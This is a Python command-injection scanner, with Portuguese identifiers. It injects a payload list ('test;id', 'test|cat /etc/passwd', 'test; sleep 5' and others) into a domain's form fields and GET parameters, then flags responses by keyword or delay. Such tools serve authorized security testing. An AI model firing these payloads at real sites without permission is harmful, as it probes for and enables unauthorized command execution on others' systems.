import requests
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import os
from termcolor import colored

payloads = [
    "test;id",
    "test&&id",
    "test|id",
    "test$(id)",
    "test`id`",
    "test;uname -a",
    "test&&whoami",
    "test|cat /etc/passwd",
    "test; sleep 5",
]

indicadores = [
    "uid=", "gid=", "root", "bash", "command not found",
    "syntax error", "unexpected", "linux", "apache",
    "sh: ", "Permission denied", "No such file or directory"
]

def extrair_formularios(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except:
        return []

def detectar_injecao(resposta_texto):
    texto = resposta_texto.lower()
    for indicio in indicadores:
        if indicio in texto:
            return True
    return False

def testar_get(url, payload):
    if "?" in url:
        test_url = url + payload
    else:
        test_url = url + "?input=" + payload

    start = time.time()
    try:
        res = requests.get(test_url, timeout=10)
        duration = time.time() - start
        if detectar_injecao(res.text) or duration > 4.5:
            return True, test_url
    except:
        pass
    return False, ""

def testar_post(form, url_base, payload):
    action = form.get("action") or ""
    full_url = urljoin(url_base, action)
    method = form.get("method", "get").lower()
    campos = {}

    for input_tag in form.find_all("input"):
        nome = input_tag.get("name")
        if nome:
            campos[nome] = payload

    start = time.time()
    try:
        if method == "post":
            res = requests.post(full_url, data=campos, timeout=10)
        else:
            res = requests.get(full_url, params=campos, timeout=10)

        duration = time.time() - start
        if detectar_injecao(res.text) or duration > 4.5:
            return True, full_url
    except:
        pass
    return False, ""

def salvar_relatorio(domain, linhas):
    path = "relatorios"
    if not os.path.exists(path):
        os.makedirs(path)
    filename = os.path.join(path, f"command_injection_{domain.replace('.', '_')}.txt")
    with open(filename, "w", encoding="utf-8") as f:
        f.write("Relatório de Command Injection\n")
        f.write("===============================\n\n")
        for linha in linhas:
            f.write(linha + "\n")
    print(colored(f"[+] Relatório salvo em {filename}", "cyan"))

def scan_command_injection(domain):
    print(f"Scanning {domain} for command injection vulnerabilities...\n")
    url_base = f"http://{domain}"
    report = []
    encontrado = False

    formularios = extrair_formularios(url_base)
    if formularios:
        for form in formularios:
            for payload in payloads:
                vulnerable, target = testar_post(form, url_base, payload)
                if vulnerable:
                    print(colored(f"[!] Command Injection detectado (POST): {target} [Payload: {payload}]", "red"))
                    report.append(f"[POST] {target}\n  Payload: {payload}")
                    encontrado = True

    # Teste GET simples
    for payload in payloads:
        vulnerable, target = testar_get(url_base, payload)
        if vulnerable:
            print(colored(f"[!] Command Injection detectado (GET): {target} [Payload: {payload}]", "red"))
            report.append(f"[GET] {target}\n  Payload: {payload}")
            encontrado = True

    if encontrado:
        salvar_relatorio(domain, report)
    else:
        print(colored("[-] No Command Injection vulnerabilities detected.", "green"))
